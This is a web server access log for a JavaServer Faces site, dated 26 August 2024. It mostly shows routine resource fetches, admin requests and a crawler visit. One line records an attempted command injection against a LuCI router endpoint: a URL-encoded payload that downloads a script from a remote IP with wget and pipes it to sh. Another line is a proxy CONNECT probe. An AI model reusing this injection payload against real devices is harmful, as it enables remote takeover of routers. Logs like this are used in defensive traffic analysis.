91.229.215.156 - - [26/Aug/2024:08:35:37 +0330] "GET /javax.faces.resource/primeicons/primeicons.ttf.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
91.229.215.156 - - [26/Aug/2024:08:35:37 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-solid-900.woff2.xhtml?ln=icons HTTP/1.1" 304 -
91.229.215.156 - - [26/Aug/2024:08:35:37 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 304 -
91.229.215.156 - - [26/Aug/2024:08:35:41 +0330] "POST /admin/?page=22&item=5f25082d9496205ef273facb HTTP/1.1" 200 324642
91.229.215.156 - - [26/Aug/2024:08:35:41 +0330] "GET /javax.faces.resource/messages/messages.png.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 304 -
91.229.215.156 - - [26/Aug/2024:08:35:47 +0330] "POST /admin/?page=22&item=5f25082d9496205ef273facb HTTP/1.1" 200 -
154.213.184.25 - - [26/Aug/2024:09:47:42 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
185.224.128.83 - - [26/Aug/2024:10:00:51 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 805
84.0.83.218 - - [26/Aug/2024:10:27:00 +0330] "GET / HTTP/1.0" 200 6039
152.32.135.214 - - [26/Aug/2024:10:27:48 +0330] "-" 400 2041
152.32.135.214 - - [26/Aug/2024:10:27:59 +0330] "GET / HTTP/1.1" 200 6041
152.32.135.214 - - [26/Aug/2024:10:28:18 +0330] "GET /favicon.ico HTTP/1.1" 404 743
152.32.135.214 - - [26/Aug/2024:10:28:18 +0330] "GET /robots.txt HTTP/1.1" 404 742
152.32.135.214 - - [26/Aug/2024:10:28:19 +0330] "GET /sitemap.xml HTTP/1.1" 404 743
152.32.135.214 - - [26/Aug/2024:10:28:19 +0330] "GET /javax.faces.resource/js/login.js.xhtml;jsessionid=95FE8B36247CFE15C14579E78CD8DAF8 HTTP/1.1" 200 40319
152.32.135.214 - - [26/Aug/2024:10:28:19 +0330] "GET /javax.faces.resource/core.js.xhtml;jsessionid=95FE8B36247CFE15C14579E78CD8DAF8?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
152.32.135.214 - - [26/Aug/2024:10:28:20 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml;jsessionid=95FE8B36247CFE15C14579E78CD8DAF8 HTTP/1.1" 200 5640
152.32.135.214 - - [26/Aug/2024:10:28:20 +0330] "GET /javax.faces.resource/js/select2.js.xhtml;jsessionid=95FE8B36247CFE15C14579E78CD8DAF8 HTTP/1.1" 200 169126
